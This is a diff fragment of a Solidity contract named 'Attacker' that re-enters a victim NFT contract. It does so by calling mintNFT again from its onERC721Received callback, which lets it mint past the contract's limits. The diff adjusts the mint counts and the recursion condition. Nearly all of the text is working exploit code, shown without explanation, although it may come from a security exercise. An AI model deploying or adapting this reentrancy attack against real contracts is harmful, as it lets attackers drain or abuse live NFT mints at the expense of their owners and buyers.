@@ -19,14 +19,12 @@ contract Attacker is IERC721Receiver {
     }
 
 
-    uint256 upper = 25;
+    uint256 upper = 20;
     uint256 point_one_ether = 0.1 ether;
 
     function attack() external payable{
-        uint256 count = 20;
-        upper--;
 
-        victim.mintNFT{value: point_one_ether * count }(count);
+        victim.mintNFT{value: point_one_ether * upper }(upper);
     }
 
     function nftCount()external view returns(uint256){
@@ -38,11 +36,9 @@ contract Attacker is IERC721Receiver {
         require(operator == address(this), "NFTCollector: Must be sent by the NFTCollector contract itself");
         receivedNFTs.push(NFT(msg.sender, tokenId));
 
-        if(upper > 0){
-            uint256 count = 6;
-            upper--;
-
-            victim.mintNFT{value: point_one_ether * count}(count);
+        if(upper > 2){
+            upper -= 2;
+            victim.mintNFT{value: point_one_ether * upper}(upper);
         }
 
         return this.onERC721Received.selector;
